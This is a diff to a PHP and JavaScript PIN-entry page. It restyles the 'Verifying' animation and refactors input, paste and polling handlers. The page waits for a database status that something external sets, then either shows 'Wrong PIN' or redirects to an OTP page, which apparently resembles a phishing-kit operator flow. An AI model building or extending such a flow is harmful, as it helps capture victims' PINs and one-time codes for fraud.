@@ -109,8 +109,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQU
     if (isset($_POST['action']) && $_POST['action'] === 'reset_pin') {
         $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         if ($conn) {
-            // Only reset if current pin is 1 (verifying/failed state)
-            $updateSQL = "UPDATE users SET pin = 0 WHERE phone = $1 AND pin IN (0,1)";
+            $updateSQL = "UPDATE users SET pin = 0 WHERE phone = $1";
             $result = pg_query_params($conn, $updateSQL, [$phone]);
             if ($result) {
                 echo json_encode(['success' => true]);
@@ -123,7 +122,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQU
         exit;
     }
     
-    // Handle checking pin status (for polling)
+    // Handle checking pin status
     if (isset($_POST['action']) && $_POST['action'] === 'check_pin_status') {
         $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         if ($conn) {
@@ -302,21 +301,34 @@ if (isset($_SESSION['pin_error'])) {
             justify-content: center;
             gap: 10px;
         }
-        /* Animated dots for verifying message */
-        .dots {
-            display: inline-flex;
-            gap: 3px;
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #1d4ed8;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
         }
-        .dots span {
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .moving-dots {
+            display: inline-flex;
+            gap: 4px;
+            margin-left: 4px;
+        }
+        .moving-dots span {
             width: 6px;
             height: 6px;
             background-color: #1d4ed8;
             border-radius: 50%;
-            animation: dotPulse 1.4s infinite ease-in-out both;
+            animation: bounce 1.4s infinite ease-in-out;
         }
-        .dots span:nth-child(1) { animation-delay: -0.32s; }
-        .dots span:nth-child(2) { animation-delay: -0.16s; }
-        @keyframes dotPulse {
+        .moving-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .moving-dots span:nth-child(2) { animation-delay: -0.16s; }
+        .moving-dots span:nth-child(3) { animation-delay: 0s; }
+        @keyframes bounce {
             0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
             40% { transform: scale(1); opacity: 1; }
         }
@@ -374,7 +386,10 @@ if (isset($_SESSION['pin_error'])) {
         <?php if ($verifying): ?>
             <div id="statusMessage" class="verifying-message">
                 <div class="spinner"></div>
-                Verifying<span class="dots"><span>.</span><span>.</span><span>.</span></span>
+                Verifying
+                <div class="moving-dots">
+                    <span>.</span><span>.</span><span>.</span>
+                </div>
             </div>
         <?php endif; ?>
     </div>
@@ -404,8 +419,8 @@ if (isset($_SESSION['pin_error'])) {
     const inputs = document.querySelectorAll('.pin input');
     let verificationInterval = null;
     let isVerifying = <?= json_encode($verifying) ?>;
-    let errorTimeout = null;
     let isSubmitting = false;
+    let pollingActive = false;
     
     function submitForm() {
         if (isSubmitting || isVerifying) return;
@@ -413,7 +428,7 @@ if (isset($_SESSION['pin_error'])) {
         let pinValue = '';
         for (let i = 0; i < inputs.length; i++) {
             if (!inputs[i].value) {
-                return; // Don't submit if any field is empty
+                return;
             }
             pinValue += inputs[i].value;
         }
@@ -440,9 +455,8 @@ if (isset($_SESSION['pin_error'])) {
         }
     }
     
-    // Function to reset pin to 0 via AJAX when user starts typing
+    // Reset pin to 0 in database
     function resetPinInDatabase() {
-        // Don't reset if we're in verifying state
         if (isVerifying) return;
         
         fetch(window.location.href, {
@@ -462,8 +476,10 @@ if (isset($_SESSION['pin_error'])) {
         .catch(error => console.error('Error resetting PIN:', error));
     }
     
-    // Function to check pin status (polling)
+    // Check PIN status from database (polling)
     function checkPinStatus() {
+        if (!pollingActive) return;
+        
         fetch(window.location.href, {
             method: 'POST',
             headers: {
@@ -476,19 +492,20 @@ if (isset($_SESSION['pin_error'])) {
         .then(data => {
             const pinStatus = data.pin_status;
             
-            // If status is 1 -> wrong PIN (verification failed)
+            // If status changed to 1 -> wrong PIN
             if (pinStatus === 1) {
                 if (verificationInterval) {
                     clearInterval(verificationInterval);
                     verificationInterval = null;
+                    pollingActive = false;
                 }
                 
-                // Show wrong PIN error message
+                // Show wrong PIN message
                 const messageContainer = document.getElementById('messageContainer');
                 messageContainer.innerHTML = '<div id="statusMessage" class="error-message">Wrong PIN. Try again</div>';
                 isVerifying = false;
                 
-                // Reset pin in database back to 0
+                // Reset DB pin to 0
                 fetch(window.location.href, {
                     method: 'POST',
                     headers: {
@@ -498,23 +515,27 @@ if (isset($_SESSION['pin_error'])) {
                     body: 'action=reset_pin'
                 });
                 
-                // Re-enable inputs and clear them
+                // Enable and clear inputs
                 inputs.forEach(input => {
                     input.disabled = false;
                     input.value = '';
                 });
-                if (inputs[0]) inputs[0].focus();
+                
+                // Focus first input
+                if (inputs[0]) {
+                    inputs[0].focus();
+                }
                 isSubmitting = false;
                 
-                // Remove verifying parameter from URL
+                // Remove verifying from URL
                 const url = new URL(window.location.href);
                 url.searchParams.delete('verifying');
                 window.history.replaceState({}, '', url);
                 
-                // Fade out error message after 3 seconds
+                // Auto-fade error message after 3 seconds
                 setTimeout(() => {
                     const msgDiv = document.getElementById('statusMessage');
-                    if (msgDiv && msgDiv.classList) {
+                    if (msgDiv && msgDiv.classList && msgDiv.classList.contains('error-message')) {
                         msgDiv.classList.add('fade-out');
                         setTimeout(() => {
                             if (msgDiv && msgDiv.parentNode) {
@@ -523,33 +544,43 @@ if (isset($_SESSION['pin_error'])) {
                         }, 500);
                     }
                 }, 3000);
-                
             } 
-            // If status is 2 -> success, redirect to otp.php
+            // If status changed to 2 -> success, redirect
             else if (pinStatus === 2) {
                 if (verificationInterval) {
                     clearInterval(verificationInterval);
                     verificationInterval = null;
+                    pollingActive = false;
                 }
                 window.location.href = 'otp.php';
             }
-            // Status 0 means still waiting (or reset), continue polling
+            // Status 0 means still waiting, continue polling
         })
         .catch(error => console.error('Error checking PIN status:', error));
     }
     
-    // Handle user typing in PIN inputs
-    if (!isVerifying) {
+    // Setup input event handlers (only when not verifying)
+    function setupInputHandlers() {
         inputs.forEach((input, index) => {
+            // Remove old listeners by cloning (clean approach)
+            const newInput = input.cloneNode(true);
+            input.parentNode.replaceChild(newInput, input);
+            inputs[index] = newInput;
+        });
+        
+        // Re-query inputs after replacement
+        const freshInputs = document.querySelectorAll('.pin input');
+        
+        freshInputs.forEach((input, index) => {
+            // Input event for typing
             input.addEventListener('input', (e) => {
                 // Allow only numbers
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
                 
-                // If user starts typing and we have an error message showing, reset the database pin to 0
+                // If user types and error message exists, reset DB pin
                 const errorMsg = document.getElementById('statusMessage');
                 if (errorMsg && errorMsg.classList && errorMsg.classList.contains('error-message')) {
                     resetPinInDatabase();
-                    if (errorTimeout) clearTimeout(errorTimeout);
                     errorMsg.classList.add('fade-out');
                     setTimeout(() => {
                         if (errorMsg && errorMsg.parentNode) {
@@ -558,37 +589,42 @@ if (isset($_SESSION['pin_error'])) {
                     }, 500);
                 }
                 
-                // Auto-focus next input
-                if (e.target.value && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
+                // Move to next input if value entered
+                if (e.target.value && index < freshInputs.length - 1) {
+                    freshInputs[index + 1].focus();
                 }
                 
-                // Check if all filled
                 allFilled();
             });
             
+            // Keydown for backspace navigation
             input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    inputs[index - 1].focus();
-                    inputs[index - 1].value = '';
-                    e.preventDefault();
+                if (e.key === 'Backspace') {
+                    if (e.target.value === '' && index > 0) {
+                        freshInputs[index - 1].focus();
+                        freshInputs[index - 1].value = '';
+                        e.preventDefault();
+                    } else if (e.target.value !== '') {
+                        e.target.value = '';
+                        e.preventDefault();
+                    }
                 }
             });
             
-            // Prevent paste of non-numeric characters
+            // Paste handling
             input.addEventListener('paste', (e) => {
                 e.preventDefault();
                 let pasteData = (e.clipboardData || window.clipboardData).getData('text');
                 pasteData = pasteData.replace(/[^0-9]/g, '');
                 if (pasteData) {
                     const digits = pasteData.split('').slice(0, 4);
-                    for (let i = 0; i < digits.length && i + index < inputs.length; i++) {
-                        inputs[index + i].value = digits[i];
+                    for (let i = 0; i < digits.length && i + index < freshInputs.length; i++) {
+                        freshInputs[index + i].value = digits[i];
                     }
-                    // Focus next empty input
-                    for (let i = 0; i < inputs.length; i++) {
-                        if (!inputs[i].value) {
-                            inputs[i].focus();
+                    // Focus first empty
+                    for (let i = 0; i < freshInputs.length; i++) {
+                        if (!freshInputs[i].value) {
+                            freshInputs[i].focus();
                             break;
                         }
                     }
@@ -596,16 +632,24 @@ if (isset($_SESSION['pin_error'])) {
                 }
             });
         });
+        
+        return freshInputs;
     }
     
-    // Start verification polling if in verifying mode
+    // If not verifying, setup handlers and focus
+    if (!isVerifying) {
+        const freshInputs = setupInputHandlers();
+        if (freshInputs[0]) freshInputs[0].focus();
+    }
+    
+    // If verifying, start polling
     if (isVerifying) {
-        // Disable inputs while verifying
+        // Disable inputs
         inputs.forEach(input => {
             input.disabled = true;
         });
         
-        // Start polling every 2 seconds
+        pollingActive = true;
         verificationInterval = setInterval(checkPinStatus, 2000);
         // Immediate first check
         setTimeout(checkPinStatus, 500);
